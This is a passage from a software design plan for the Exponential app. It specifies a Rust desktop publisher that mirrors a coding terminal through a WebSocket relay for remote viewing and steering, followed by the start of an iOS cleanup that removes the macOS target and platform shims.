  "camelCase"` on the struct — pick one and be consistent. **Verify against
  `protocol.ts`, not memory.**
- The input field is **`data`** (a UTF-8 `String`, `max 8 * 1024`), **not** `bytes`.
  A native client shipped `bytes` and steer input silently no-op'd.
- Terminal **output is never JSON**. It is a binary WebSocket frame whose first byte
  is `0x01` followed by verbatim PTY bytes. On send: `Message::Binary([&[0x01],
  &pty_bytes].concat())`. On receive (viewer side — not us, but for symmetry):
  `bytes[0] == 0x01` ⇒ feed `&bytes[1..]` to the emulator. The desktop is a
  publisher, so it **produces** `0x01` frames and **never consumes** them.
- Close codes: `4001 CLOSE_SESSION_ENDED`, `4002 CLOSE_REPLACED`, `4003
  CLOSE_UNAUTHORIZED`, `4008 CLOSE_SLOW_CONSUMER`. Handle each distinctly (§8.6).

**Conformance:** `frames.rs` gets a round-trip test module asserting that
`serde_json::to_string(&ClientFrame::Input{ data: "x".into() })` produces exactly
`{"t":"input","data":"x"}` and that each `ServerFrame` variant from a captured relay
string deserializes. There is no fixture package for steer frames (unlike
`packages/electric-protocol` for the sync engine), so these vectors are authored
inline from `protocol.ts`.

### 8.2 Tickets — consume only (`lib.rs`)

The desktop deserializes ticket claims only for its own logging/telemetry; it never
verifies or signs. `steer.mintTicket` returns either `{ disabled: true }` or
`{ ticket, url }`, where `url` is the full dial URL with `?ticket=<ticket>`
already embedded (`steerTicketUrl` in `apps/web/src/lib/steer.ts`). The desktop
**uses `url` as-is** — it must not reconstruct the URL, because the relay reads the
ticket from the query string (WebSocket clients can't set custom headers reliably;
`tokio-tungstenite` can, but the relay only looks at `?ticket=`).

```rust
// mirrors packages/steer-ticket SteerTicketClaims — deserialize-only
#[derive(serde::Deserialize)]
pub struct SteerTicketClaims {
    pub sub: String, pub ws: String,
    pub name: Option<String>, pub device_label: Option<String>, pub session_id: Option<String>,
    pub role: SteerRole,  // control | publisher | viewer
    pub perm: SteerPerm,  // view | steer
    pub iat: i64, pub exp: i64,
}
```

The claims are `base64url(json).base64url(hmac)`; to read `exp`/`iat` for
skew-checking (§8.7) split on the single `.`, base64url-decode the first part, parse
JSON. **Do not** validate the HMAC — that is the relay's job and we lack the secret.

The `url` may carry an `http`/`https` **or** `ws`/`wss` scheme depending on how
`STEER_RELAY_URL` was configured; the server already normalized it to `ws(s)` via
`steerWsBase`. The desktop must accept both `ws://…` (LAN self-host, no TLS) and
`wss://…` (cloud) — see §8.7.

### 8.3 Control channel (per app, per account) — `control_channel.rs`

The control socket is the desktop's **device presence** registration. It is what
makes "Start on my desktop" work from the web and iOS: the phone calls
`steer.myDevices()` → the relay's in-memory `devices` map (populated by our `online`
frame) → the phone picks a device → `steer.startSession({issueId, deviceId})` → relay
routes a `start_session` frame down our control socket → we invoke the §7 launcher.

**Lifecycle & gating:**

1. On login (and whenever the active account changes), `crates/app` spawns one
   `ControlChannel` task per account via the background executor. Before dialing it
   calls `steer.config()`; if `{ enabled: false }` it does **nothing** and schedules a
   slow recheck (see below). This mirrors `getSteerRelayConfig` returning `null` when
   `STEER_RELAY_URL`/`STEER_RELAY_SECRET` are unset — an unconfigured instance is a
   normal state, never an error (EXP-4: the desktop must not show "not connected"
   noise when steer is simply off).
2. **Persistent `deviceId`.** Generate a UUIDv4 **once per install** and persist it in
   the app config dir (`~/Library/Application Support/Exponential/device_id` on macOS,
   `$XDG_CONFIG_HOME/exponential/device_id` on Linux) alongside the token store. The
   `deviceId` must survive restarts so the relay's replace-on-reconnect logic
   (`CLOSE_REPLACED` when a second socket announces the same `deviceId`) evicts the
   stale socket rather than accumulating ghost devices. **`deviceLabel`** is the OS
   hostname (`hostname` crate or `gethostname`) — human-readable in the phone picker.
3. **Mint + dial.** `steer.mintTicket({ kind: "control", deviceLabel })` →
   `{ ticket, url }`. Dial `url` with `tokio-tungstenite`. On open, immediately send
   `ClientFrame::Online { device_id, device_label }`. The relay stores the entry in
   its `devices` map keyed by `sub → deviceId`.
4. **Inbound routing.** The only server frame the control socket receives that we act
   on is `StartSession { issue_id }`. On receipt, marshal to the foreground executor
   and call the §7 launcher's `start_coding(issue_id, StartOrigin::Remote)`. Everything
   the launcher needs (repo resolve, JIT token, worktree, `.mcp.json`, spawn) is §7;
   the control channel just delivers the trigger. `Bye`/`Error`/`Kill` on the control
   socket are logged; `Kill` here is not session-scoped and is a no-op for us.
5. **Reconnect with backoff.** On any disconnect, reconnect with exponential backoff
   (250ms → 500ms → 1s → … capped at 30s, full jitter). A ticket lasts only ~60s
   (connect window) but the socket outlives it once established, so each reconnect
   re-mints. Reset backoff to base on a successful `online` round-trip.
6. **Slow recheck when disabled / NOT_FOUND.** If `steer.config()` reports disabled,
   **or** the relay rejects the ticket in a way that indicates the account/relay is
   not provisioned, back off to a **15-minute** slow-poll of `steer.config()` instead
   of hammering. This matches the native design: a self-host instance that never
   turns steer on should generate essentially zero steer traffic.

The control channel holds **no** PTY and **no** session state; it is a thin presence
beacon. Exactly one control socket per account per app process. Multi-window shares
the single control channel (it is account-scoped, not window-scoped).

### 8.4 Session publisher (per coding session) — `publisher.rs`

When a coding session starts (locally via §7's "Start coding", or remotely via a
`start_session` that §7 handled), `crates/coding` calls
`steer::publisher::publish(session)`. This is **best-effort and non-blocking**: if
the relay is disabled or unreachable, the coding session runs fine locally with no
remote mirror. The publisher never gates the terminal.

**Handshake:**

1. `steer.mintTicket({ kind: "publisher", codingSessionId })` → the server checks
   `session.userId === caller` (only the owner's desktop may publish) and returns
   `{ ticket, url }` (or `{ disabled: true }` ⇒ skip).
2. Dial `url`. On open send
   `ClientFrame::Hello { session_id, issue_id, cols, rows }` with the **real terminal
   geometry** taken from the live `crates/terminal` grid (`term.grid().columns()` /
   `screen_lines()`), **not a hardcoded 80×24**. The native mac host sent a fixed
   80×24 because `PtyTail`/`script(1)` obscured the true size and its SIGWINCH plumbing
   was broken — that bug is structurally gone here because **the Rust app owns the PTY
   master** (portable-pty, §6) and knows the exact size at all times. Sending true
   geometry means the phone viewer's xterm.js renders without reflow artifacts from the
   first frame.
3. On `hello` the relay creates the room (or, on reconnect, **resumes** the existing
   room — see §8.6) and broadcasts **`presence`**. It does **not** send a `resize` back
   to the publisher (verified against `hub.ts`'s hello handler — it only calls
   `broadcastPresence`; the resize→viewer path fires on viewer `join`, not to the
   publisher on hello). The publisher sets geometry via its own `hello`; it never
   receives one back.

**Output tee (the hot path).** The publisher does **not** re-read the PTY. §6's
single PTY **read-loop is the tee**: `crates/terminal/src/read_loop.rs` does one
blocking `read()` per terminal and fans the bytes out to (a) the alacritty `Term`
emulator and (b) — when a publisher is attached — a bounded channel drained by this
publisher task. The steer crate exposes the consumer end:

```rust
// terminal side installs a tee sink when a publisher attaches:
pub struct PublisherSink { tx: flume::Sender<Bytes> }   // bounded, capacity 32 (inFlightCap)
// read_loop after feeding the emulator:
if let Some(sink) = &self.steer_sink {
    // NEVER block the terminal on the relay: try_send, drop on full.
    let _ = sink.tx.try_send(chunk.clone());   // drop-on-overflow (output only)
}
```

The publisher task owns the WebSocket write half and loops:

```rust
loop {
    tokio::select! {
        // 1) terminal output → binary 0x01 frame
        chunk = out_rx.recv_async() => {
            let mut buf = Vec::with_capacity(chunk.len() + 1);
            buf.push(OUTPUT_OPCODE);
            buf.extend_from_slice(&chunk);
            ws.send(Message::Binary(buf)).await?;   // control frames use a separate priority path
            ring.push(&chunk);                       // 256 KiB replay ring (below)
        }
        // 2) relay → publisher control frames
        msg = ws.next() => match parse(msg) {
            ServerFrame::Input { data }   => pty_writer.write_all(data.as_bytes())?,  // inject remote keystrokes
            ServerFrame::Resize { cols, rows } => terminal.resize(cols, rows),        // §6 pty.resize + Term.resize
            ServerFrame::Kill             => break KillReason::RemoteKill,            // → coding.end_session
            ServerFrame::Presence { viewers, steerer_id } => ui.set_remote_steerer(steerer_id, viewers),
            ServerFrame::Resync           => replay_ring(&ring, &mut ws).await?,      // resend ring on demand
            ServerFrame::Bye | Error{..}  => break,
        }
    }
}
```

**Backpressure — `inFlightCap = 32`, DROP output, NEVER control.** The tee channel is
bounded at 32 chunks. On overflow we drop **output** chunks (a laggy viewer loses a
few frames of scrollback, not correctness — the relay itself also has a
`CLOSE_SLOW_CONSUMER = 4008` guard on viewer queues). We **never** drop or reorder
control frames (`resize`/`kill`/`bye`) — those go through a separate unbounded control
path or are sent inline on the select loop, which is naturally serialized. This is the
same rule the relay enforces viewer-side; the publisher applies it on the producer
side so a slow relay/socket can never wedge the local terminal.

**Input injection.** `ServerFrame::Input { data }` bytes are written to the **shared
PTY writer** (§6's `pty.take_writer()` clone) exactly as if the local user typed them.
There is no separate injection path — remote keystrokes and local keystrokes converge
on the one PTY master. UTF-8 `data`, ≤ 8 KiB per frame (relay-enforced).

**Resize.** `ServerFrame::Resize` from the relay is the steerer's viewport asking to
resize; apply it via §6 `terminal.resize(cols, rows)` (which does `pty.resize()` +
`Term::resize()` and triggers a real SIGWINCH to the child — again clean because we own
the master). Conversely, when the **local** window resizes the grid, the publisher
sends `ClientFrame::Resize { cols, rows }` up so viewers reflow. Publisher-origin and
viewer-origin resizes must not ping-pong: send up only on a genuine local geometry
change (debounced), and apply down only when the incoming size differs from current.

**256 KiB replay ring.** The publisher keeps a `RingBuffer` of the last 256 KiB of raw
PTY output (mirror of the relay's `RING_CAP_BYTES = 256 * 1024`). `ServerFrame::Resync`
is sent to the publisher **only on the slow-consumer recovery path** — when a lagging
viewer recovers, the relay asks the publisher to replay so the viewer can catch up; the
publisher answers by resending its ring as `0x01` frames. **Viewer-join scrollback is NOT
a resync:** on a viewer `join` the relay replays **its own** ring directly to the joining
viewer, transparently to the publisher (no publisher involvement). So the publisher must
**not** expect a `resync` on every viewer join — keep the `Resync` handler for the
slow-consumer case only (verified against `hub.ts`).

**End.** When the coding session ends (child exits, or local user stops it), send
`ClientFrame::Bye { outcome: Some("exit:<code>") }` and close cleanly (1000). §5/§7's
`codingSessions.end` flips the synced row to `ended`.

### 8.5 Claim model & the "Remote steering" banner (§3.4)

The relay is the single source of truth for who holds the steer claim (relay memory:
`room.steerer`). The desktop's UI reacts to `presence` frames:

- **The local user is NEVER gated.** Whatever the claim state, keystrokes typed into
  the focused terminal go straight to the PTY writer (§6). The claim only arbitrates
  **remote** steerers among themselves; the publisher (local human) always has
  unmediated access. This is a hard rule — do not add any "someone else is steering,
  your input is blocked" behavior locally.
- When `presence.steerer_id` is non-null and belongs to a remote viewer, the terminal
  tab shows a compact banner: **"Remote steering — {name}"** (name from the matching
  `PresenceViewer`) plus a **"Take over"** button. Rendered with gpui-component
  `Notification`/`Banner`-style chrome in the terminal panel header, compact density.
- **Take over = the publisher sends `ClientFrame::Claim` (resolved, not open).** The
  local user does **not** hold the relay claim by default (they don't need it — they type
  directly). "Take over" exists so the local user can *revoke* a remote steerer, and
  `hub.ts` answers exactly how: in **both** the `claim` and `release` handlers,
  `if (room.publisher === conn) { this.publisherTakeover(room); return; }` — so a
  **publisher-sent `claim` (or `release`) clears `room.steerer`** and re-broadcasts
  presence (`publisherTakeover`). The `Claim`/`Release` variants are already in the §8.1
  `ClientFrame` enum, so no protocol change is needed. Therefore the terminal-tab "Take
  over" button simply sends `ClientFrame::Claim`; the relay's publisher-branch clears the
  remote steerer and re-broadcasts presence. For viewers steering among themselves,
  release-then-claim is the relay's own first-claim-wins arbitration and needs no desktop
  involvement.

### 8.6 Auto-reconnect (gpui advantage) & close-code handling

The natives **deferred** publisher reconnect; the Rust publisher does it, and the
relay already supports it: on re-`hello` with the same `sessionId`, the relay clears
the room's `staleTimer` and resumes the **same room** (`hub.ts`: "Re-hello after a
drop: resume the same room"), evicting any lingering old publisher socket with
`CLOSE_REPLACED`.

Reconnect policy (`publisher.rs`):

- On an unexpected socket drop (not a clean `bye`), if the coding session row is still
  `running` (checked via the Store, §8.8), reconnect with exponential backoff + jitter
  (base 250ms, cap 15s). Re-mint a fresh publisher ticket each attempt (the old one is
  expired). Re-send `hello` with **current** geometry; the relay **resumes the same room
  with its ring intact and broadcasts presence** (`hub.ts`: re-hello clears `staleTimer`,
  resumes the room, evicts any lingering old publisher with `CLOSE_REPLACED`). The
  publisher then **simply resumes live teeing — it must NOT wait for a `resync`** (no
  resync is sent on reconnect; `resync` is the slow-consumer path only, §8.4). The grace
  window before the relay hard-closes the room is bounded by the relay's `staleTimer` — so
  reconnect promptly; a long backoff can lose the room.
- Close-code semantics:
  - **4001 `CLOSE_SESSION_ENDED`** — the session is over (kill or normal end). Do
    **not** reconnect; ensure the local session is torn down.
  - **4002 `CLOSE_REPLACED`** — a newer publisher socket for the same session took
    over (or a stale one was evicted). Do **not** reconnect *this* socket; the winner
    is authoritative. In practice this fires when our own reconnect races an old
    socket — expected, benign.
  - **4003 `CLOSE_UNAUTHORIZED`** — ticket rejected (bad signature / expired /
    wrong owner). Re-mint **once**; if it fails again, stop and surface an error
    (likely clock skew — §8.7 — or the session isn't owned by this user).
  - **4008 `CLOSE_SLOW_CONSUMER`** — applies to viewers, not publishers; if we ever see
    it, treat like a normal drop and reconnect.

### 8.7 Transport: ws AND wss, no forced TLS, clock-skew bounding (gpui advantages + risks)

**Both schemes.** `tokio-tungstenite` with `rustls-tls-native-roots` handles `wss://`
against a TLS relay (cloud `steer.exponential.at`). For self-host, `STEER_RELAY_URL`
may be a plain `ws://relay.lan:4002` — the desktop **must not force TLS**. Branch on
the URL scheme: `wss` → `connect_async_tls_with_config` with a rustls client config;
`ws` → `connect_async` plain. All steer connections dial **out** (the relay never dials
the desktop), so a LAN `ws://` needs no inbound firewall exception.

**LAN / self-signed certs (risk).** A self-host relay behind `wss://` with a
self-signed or private-CA cert will fail native-root verification. Provide an opt-in
escape hatch mirroring how the sync/api crates handle a self-signed Electric/web
endpoint: an app setting **"Allow self-signed relay certificate"** (per-relay-host,
off by default) that swaps in a rustls `ClientConfig` with a custom
`ServerCertVerifier` accepting the pinned host. **Never** default to
`danger_accept_invalid_certs`. **Open question:** whether to share one TLS-trust
setting across the web endpoint, Electric, and the relay, or keep them independent —
lean toward one shared "trusted self-signed hosts" list in `crates/api` config that
`crates/steer` reads.

**Clock skew (risk the natives never handled).** The ticket `exp` is `iat + 60s` — a
narrow connect window. If the desktop clock is >60s ahead of the relay, a freshly
minted ticket can already be "expired" from the relay's view and the connect is
rejected with `4003`. Because the **server** mints `iat`/`exp` from **its** clock, the
skew that matters is desktop-vs-relay, and the relay verifies against **its** clock —
so a fast desktop clock is harmless (server timestamps are server-relative) but a slow
relay clock or a desktop that delays sending the ticket after minting can bite.
Mitigations:
  - **Dial immediately** after `mintTicket` — do not mint speculatively and sit on the
    ticket. Budget < 5s between mint and `connect_async`.
  - On a `4003`/`expired`, **re-mint once and retry immediately** before surfacing an
    error.
  - If two consecutive fresh-ticket connects fail with `expired`, surface a **clear,
    specific** error: *"Steer relay rejected the connection (ticket expired on
    arrival) — check that this machine's clock is in sync (NTP)."* This is the "bound +
    surface a clear error" the brief calls for; a silent retry loop on skew is the
    native failure mode we're fixing.

### 8.8 Kill-switch: the Electric own-row watch (native Phase-6 TODO — done here)

The durable abort path is **not** the relay. `steer.killSession` flips the
`coding_sessions` row to `status = ended` in Postgres (and best-effort fans a relay
`kill`; `relayPostKill` never throws). The relay `kill` is a nice-to-have for instant
teardown; the **authoritative** kill is the DB row flip, which reaches the desktop over
**Electric sync** even when the relay is unreachable.

The desktop therefore watches its **own** `coding_sessions` rows over the §5 sync
engine. `crates/coding` (or `crates/steer` reading the Store) subscribes to the
`coding_sessions` collection filtered to the sessions this desktop started; when a
watched row transitions `running → ended` **and the desktop didn't initiate it**, the
launcher aborts: kill the `claude` child, close the publisher socket with a clean
`bye`, and mark the terminal tab stopped. The natives listed this as a Phase-6 TODO and
never shipped it; the gpui desktop **must** implement it — it is the only kill path that
survives a dead relay. Concretely, hook it into §5's collection-change notification:
the `coding_sessions` Entity's observer checks each locally-owned session's status and
signals `crates/coding` to tear down. This closes the loop for the Phase 6 gate ("an
own-row Electric kill aborts the session").

### 8.9 Ties to other surfaces & sections

- **§6 embedded terminal** owns the PTY master and the single read-loop tee; the
  publisher is a consumer of that tee (`PublisherSink`) and a producer into the shared
  PTY writer for injected input. The publisher never opens its own PTY or re-reads —
  interface is the `flume` output channel + the writer clone.
- **§7 IDE features / Start-coding launcher** owns session creation
  (`codingSessions.start`/`.end`, worktree, `.mcp.json`, spawn). The control channel's
  `start_session` handler calls the launcher; the publisher attaches to the session the
  launcher created. `startSession` server-side already fails fast if no repo is linked
  or the plan cap is hit — the desktop surfaces those tRPC errors.
- **§5 sync engine** provides the `coding_sessions` collection the kill-switch watches
  and the `steer.config`/`myDevices` reads (via `crates/api` tRPC).
- **Web `apps/web/src/components/steer-terminal.tsx`** (xterm.js viewer over the relay)
  is **unchanged** — it consumes `0x01` output frames and sends `input`/`claim`/etc.
  exactly as before. The desktop publisher's frames must render there without change;
  this is the primary Phase-6 gate check.
- **"Start on my desktop"** from web/iOS uses `steer.myDevices` +
  `steer.startSession` → the relay routes `start_session` down the desktop's control
  socket → §7 launcher. The desktop is the terminus of that flow.

### 8.10 Phase 6 gate (verbatim)

The desktop publishes a live coding session; a web viewer (`steer-terminal.tsx`)
watches **and** steers (types into `claude`); **Take over** does release-then-claim; a
**kill from web** ends the session; **wss** against a TLS relay **and** **ws** against a
LAN relay both connect; the publisher **reconnects** after a socket drop resuming the
room; an **own-row Electric kill** aborts the session even with the relay unreachable.
Additionally: control-channel presence appears in the phone's device picker; a remote
`start_session` launches a real coding session on the desktop; the `hello` carries true
geometry (verified by a non-80×24 viewer viewport rendering without reflow); output
backpressure drops frames but never wedges the local terminal or drops a `kill`.


---

## 9. iOS self-containment + clean-code pass + EXP-1#13 carry-in (parallel track)

This is a **parallel track** with **zero dependency** on the desktop work (§03–§08). It can start on day one and land independently — the only shared artifact is the EXP-1#13 sync hardening, which both this iOS pass and the new Rust sync engine (§05) implement from the same source of truth. Its job is threefold: (1) **delete** the native macOS target and everything that only existed to feed it (the ghostty terminal vendoring, the ditched Preview feature, the mac-only Tuist scaffolding); (2) **re-make iOS self-contained** — `ExpCore`/`ExpUI` stop being "cross-platform frameworks shared with the mac app" and become plain iOS(+iPad) frameworks, with all the `#if os(macOS)` cruft that self-containment now makes dead code removed; and (3) **carry in the EXP-1#13 sync fix** (all issues/projects suddenly vanishing) that was written on `archive/native-desktop-wave1-2` but dropped when the native apps were shelved.

The corresponding execution phase is **Phase 7 — iOS self-containment + clean-code + sync carry-in (PARALLEL)**. The gate is unchanged from that phase: the `Exponential` scheme builds **iOS-only** (7 targets / 4 schemes, no mac target in the generated project); `ExpCoreTests` green (AnnotationGeometry parity + VTScreen); Share-to-Exponential still reads the app-group token; the 14 shapes sync and a forced 409 does an atomic refetch on iOS.

### 9.1 What iOS is after this pass

`apps/ios/` stays a Tuist-generated Swift project. Its end state is **two shared frameworks** and **four app-side targets** that link them:

- **`ExpCore`** (framework, `at.exponential.core`) — the Foundation / GRDB / Security / CryptoKit / os data + sync + domain layer. Contains `Domain/` (row structs + enums), `DB/` (GRDB store + migrations), `Electric/` (`ShapeClient.swift`, `SyncManager.swift`, `ShapeMessage.swift` — the proven native sync engine §05 studies), `Auth/` (`KeychainStore.swift`, `AccountStore.swift`, `AuthRepository.swift`), `API/` (tRPC client + `IssuesApi`, `IssueImagesApi`, `SteerApi`, …), `Shared/` (`SharedAppGroup.swift`, `SharedProjectMirror.swift`), `Annotate/` (`AnnotationGeometry.swift`), `Terminal/VTScreen.swift`, and `AppConstants.swift`. **No SwiftUI, no cmark, no Firebase.**
- **`ExpUI`** (framework, `at.exponential.ui`) — the SwiftUI + cmark-gfm + MarkdownUI presentation layer: `CrossPlatform.swift`, `GlassTheme.swift`, `DesignTokens.generated.swift`, `IssueEditorModel.swift` (the block-based GFM editor core), `MarkdownConversion.swift`, `MarkdownAttributes.swift`, `IssueRefs.swift`, `WorkspaceAvatar.swift`, etc. Depends on `ExpCore` + `cmark-gfm`/`cmark-gfm-extensions`.
- **`Exponential`** / **`Exponential-Staging`** (apps) and **`ShareExtension`** / **`ShareExtension-Staging`** (app extensions) — the four app-side targets. Keeping `ExpCore`/`ExpUI` as frameworks (rather than folding their sources into the app) is deliberate: four targets link them, so a shared framework avoids **4× recompiles** of the data + UI layers. This is the reason NOT to collapse them into the app even though the mac consumer is gone.

`ExpCoreTests` remains the test target and the gate: the **AnnotationGeometry TS-parity test** (locks `AnnotationGeometry.swift` to the TS source of truth `shapes.test.ts`) plus **`VTScreenTests`** (the terminal screen model used by the iOS steer viewer).

**iOS still needs, and this pass KEEPS, all shared code that is genuinely cross-consumer or iOS-facing:**

- `ExpCore/Sources/Terminal/VTScreen.swift` + its `VTScreenTests` — VTScreen is the screen model behind the **iOS steer VIEWER** (`SteerViewerModel` / `SteerTerminalView` / `SteerSessionSection` in the iOS app). The iOS app watches a desktop-published session; it does not publish. Keep VTScreen and its tests.
- `ExpCore/Sources/API/SteerApi.swift` — but trimmed (see §9.4). iOS uses `config`, `mintViewerTicket`, `myDevices`, and `startSession` (remote-start-from-phone). The publisher/control mint paths are desktop-only dead code on iOS.
- `ExpCore/Sources/Shared/SharedAppGroup.swift` + `SharedProjectMirror.swift` — the ShareExtension app-group plumbing. Already mac-free; untouched.

### 9.2 Deletions

**Tracked (git rm):**

```
apps/ios/ExponentialMac/            # all 46 Swift files (see list below)
apps/ios/ExponentialMac.entitlements
apps/ios/scripts/setup-ghostty-macos.sh
apps/ios/scripts/                   # remove the now-empty directory
```

The 46 `ExponentialMac/` files are the entire native mac shell and everything downstream of it: `ExponentialMacApp.swift`, `MacRootView.swift`, `MacAppDependencies.swift`, `MacAppSupport.swift`, `MacShell.swift`; the terminal stack `MacGhosttyApp.swift` / `MacGhosttyTerminal.swift` / `MacTerminalDock.swift`; the coding launcher `MacCodingLauncher.swift` / `MacRunConfigLauncher.swift` / `MacCodingSettings.swift` / `GitWorktree.swift`; the steer **publisher** stack `MacSteerPublisher.swift` / `MacSteerPtyTail.swift` / `MacSteerControlChannel.swift` / `SteerProtocol.swift`; the **ditched Preview feature (EXP-2c)** `MacPreviewAnnotateView.swift` / `MacPreviewBackends.swift` / `MacPreviewConfig.swift` / `MacPreviewController.swift` / `MacPreviewDoctor.swift` / `MacPreviewHost.swift` / `MacPreviewPane.swift` / `MacProjectPreviewSettingsView.swift`; `MacDiffView.swift`; the mac markdown pair `MacMarkdownEditor.swift` / `MacMarkdownImageLoader.swift` / `MacAnnotationRenderer.swift`; and the remaining mac views `MacRootView`, `MacLoginView`/`MacLoginViewModel`, `MacIssueListView`, `MacIssueDetailView`, `MacIssueControls`, `MacInboxView`, `MacCreateIssueView`/`MacCreateProjectView`/`MacCreateWorkspaceView`, `MacSettingsView`/`MacWorkspaceSettingsView`/`MacIntegrationsView`, `MacGithubRepoPicker`, `MacInviteAcceptView`, `MacEventPhrases`, `MacFeedbackReporter`, `SendFeedbackSheet`, `MacToasts`. **Delete the directory wholesale** — none of these have an iOS consumer (the iOS app has its own `Exponential/**` view tree).

**Local rm (gitignored build/vendor artifacts — never tracked, so just `rm -rf`):**

```
apps/ios/vendor/            # GhosttyKit.xcframework + ghostty-resources (setup-ghostty-macos.sh output)
apps/ios/build/
apps/ios/Derived/
apps/ios/Tuist/.build/
apps/ios/*.xcodeproj        # regenerable by tuist
apps/ios/*.xcworkspace      # regenerable by tuist
```

**`.gitignore` edit** — remove the now-meaningless `vendor/` entry and the libghostty comment block that explains it:

```diff
-# libghostty build (cloned ghostty source + local zig toolchain + build output);
-# produced by scripts/build-libghostty-macos.sh, never committed.
-vendor/
```

Leave the rest of `.gitignore` (Tuist-generated `*.xcodeproj`/`*.xcworkspace`/`Derived/`/`.build/`, Xcode `xcuserdata`, `.DS_Store`, and the GoogleService-Info committed-on-purpose note) intact.

### 9.3 `Project.swift` rewrite (343 → ~230 lines)

`Project.swift` currently declares **9 targets / 6 schemes**. After the rewrite it declares **7 targets / 4 schemes** and is iOS-only. Concretely:

**Remove the 6 mac-only top-level `let`s:** `macSources`, `macDependencies`, `macResources`, `macInfoPlist`, `ghosttyBootstrapScript`, `macLinkSettings`. These are the only references to `ExponentialMac/**`, `vendor/GhosttyKit.xcframework`, the ghostty folder-references, the `Bootstrap libghostty` pre-script, and the mac hardened-runtime/`OTHER_LDFLAGS` link settings — all now dead.

**Remove the 2 macOS targets** `Exponential-macOS` and `Exponential-macOS-Staging`, and their **2 schemes** `Exponential-macOS` / `Exponential-macOS-Staging`.

**Retarget the 3 shared targets to iOS-only.** On `ExpCore`, `ExpCoreTests`, and `ExpUI`:

```diff
-            destinations: [.iPhone, .iPad, .mac],
+            destinations: [.iPhone, .iPad],
...
-            deploymentTargets: .multiplatform(iOS: "17.4", macOS: "14.0"),
+            deploymentTargets: .iOS("17.4"),
```

The four app-side targets (`Exponential`, `Exponential-Staging`, `ShareExtension`, `ShareExtension-Staging`) are **already** `[.iPhone, .iPad]` / `.iOS("17.4")` — leave them exactly as they are, including `sharedSources = ["Exponential/**"]`, `shareExtensionSources` (the curated GRDB-free `ExpCore/Sources/...` subset the extension compiles into its own module), the two `GoogleService-Info.plist` resource sets, and the `SWIFT_ACTIVE_COMPILATION_CONDITIONS = STAGING` split.

**Comment sweep in `Project.swift`.** Three comments are now stale and lie about the architecture — fix them to iOS-only:

- `// ExpCore: platform-neutral data/sync/domain layer shared with macOS later.` → `// ExpCore: iOS(+iPad) data/sync/domain layer. Foundation/GRDB/Security/CryptoKit/os only — NO cmark/MarkdownUI/Firebase/SwiftUI.`
- `// ExpUI: cross-platform SwiftUI layer (theme, glass modifiers, ...) shared by the iOS and macOS apps.` → `// ExpUI: the iOS SwiftUI presentation layer (theme, glass modifiers, status/priority colors, WorkspaceAvatar, the block markdown editor core). Depends on ExpCore.`
- The `expCoreTestSources` comment (lines 33-35) mentioning "and the Linux Zig port" → drop the Linux/Zig reference (retarget to web + iOS parity only).
- The `baseSettings` `DEVELOPMENT_TEAM`/signing comments are iOS-relevant — leave them.

**End state — 7 targets:** `ExpCore`, `ExpCoreTests`, `ExpUI`, `Exponential`, `Exponential-Staging`, `ShareExtension`, `ShareExtension-Staging`. **4 schemes:** `ExpCore`, `ExpUI`, `Exponential`, `Exponential-Staging` (the two app schemes carry run/archive actions) — i.e. drop only the two `Exponential-macOS*` schemes, leaving 4 of the original 6. The `ExpCore` scheme **doubles as the `ExpCoreTests` test scheme** (it already carries `testAction: .targets(["ExpCoreTests"])`; there is no separate `ExpCoreTests` scheme, so do not count one).

**`Tuist/Package.swift` is UNCHANGED.** Every SPM dependency it declares is still used by iOS: `GRDB` (ExpCore data layer), `MarkdownUI` + `swift-markdown-ui`→`cmark-gfm`/`cmark-gfm-extensions` (ExpUI markdown), and Firebase (`FirebaseCore`/`FirebaseMessaging`, iOS push). **`GhosttyKit` was never an SPM dependency** — it was an `.xcframework(path: "vendor/GhosttyKit.xcframework")` target dependency inside `macDependencies`, so removing `macDependencies` removes it entirely; there is nothing to touch in `Package.swift`.

**Regeneration order matters** (a stale mac target caches otherwise): delete `Derived/` + `build/` + the `.xcodeproj` + the `.xcworkspace` **first**, then from `apps/ios` run `tuist generate`. Do the deletion + `Project.swift` edit + regen as one atomic step **before** any source stripping, so that if a `#if os(macOS)` block was in fact loading a symbol some iOS path relied on, it surfaces as a **compile error in the regenerated iOS project** rather than a silent behavior change.

### 9.4 Clean-code pass — strip the now-dead `#if os(macOS)` shims

With the mac target gone, every `#if os(macOS)` branch in the shared frameworks is unreachable — the frameworks now only ever compile for iOS. Collapse each conditional to its iOS arm and delete the macOS arm and the `#if/#else/#endif` scaffolding. Grep-confirmed sites (all under `ExpCore`/`ExpUI`):

- **`ExpUI/Sources/CrossPlatform.swift`** — the biggest one. Drop the AppKit type-aliases branch so the shims resolve **unconditionally** to UIKit: `PlatformColor = UIColor`, `PlatformImage = UIImage`, `PlatformFont = UIFont`; collapse the URL-open helper to the `UIApplication.shared.open` path (delete the `NSWorkspace` arm); collapse the pasteboard-copy helper to `UIPasteboard.general` (delete the `NSPasteboard` arm); make the `.inlineNavigationTitle` modifier unconditional (delete the macOS `.navigationTitle`-only arm). After this, `CrossPlatform.swift` imports only `SwiftUI` + `UIKit`.
- **`ExpUI/Sources/MarkdownAttributes.swift`** — 5 branches → keep the UIKit (`UIFont`/`UIColor`/`NSAttributedString`) arm, delete the AppKit arm at each.
- **`ExpUI/Sources/IssueRefs.swift`** — 1 branch → UIKit arm.
- **`ExpUI/Sources/MarkdownConversion.swift`** — 1 branch → UIKit arm.
- **`ExpCore/Sources/Auth/KeychainStore.swift`** — collapse to the single **iOS Keychain** implementation, deleting the macOS file-based credential-store arm (macOS debug used a file store, not the Keychain — see `reference_macos_build.md`; that path is now dead). Also make **`import Security` unconditional** — drop the top `#if !os(macOS) import Security #endif` wrapper (lines 2-4) so the file has no leftover macOS-conditional scaffolding. **CRITICAL: preserve `kSecAttrAccessGroup`** on the Keychain queries — the `ShareExtension` reads the app's session token out of the shared Keychain access group, and dropping that attribute silently breaks Share-to-Exponential. This is an explicit MUST-NOT-BREAK.

**`SteerApi.swift` trim** — remove the two mint methods iOS never calls:

- `mintPublisherTicket(accountId:codingSessionId:)` — the publisher role belongs to the desktop app (§08); dead on iOS. **Delete.**
